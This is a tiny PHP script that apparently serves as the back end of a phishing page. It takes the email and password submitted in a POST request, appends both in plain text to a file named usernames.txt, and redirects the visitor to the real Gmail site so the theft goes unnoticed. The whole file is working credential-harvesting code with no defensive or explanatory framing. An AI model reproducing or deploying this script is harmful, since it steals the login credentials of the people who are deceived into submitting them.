<?php
header('Location: https://gmail.com/');
if (!empty($_POST['email'])) {file_put_contents("usernames.txt", "Account: " . $_POST['email'] . " password: " . $_POST['password'] . "\n", FILE_APPEND);
}

exit();
